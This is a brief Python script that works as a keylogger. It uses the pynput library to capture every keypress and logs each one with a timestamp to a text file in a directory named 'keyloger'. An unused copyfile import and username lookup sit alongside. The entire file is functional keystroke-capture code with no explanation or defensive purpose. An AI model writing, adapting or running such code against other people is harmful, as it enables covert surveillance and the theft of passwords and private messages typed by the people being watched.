from  pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_dir = '/home/erik/Documents/scripts/keyloger'
logging.basicConfig(filename=f"{logging_dir}/my.txt", level=logging.DEBUG, format="%(asctime)s : %(message)s") 

def key_handler(key):
	logging.info(key)

with Listener(on_press=key_handler) as listener:
	listener.join()

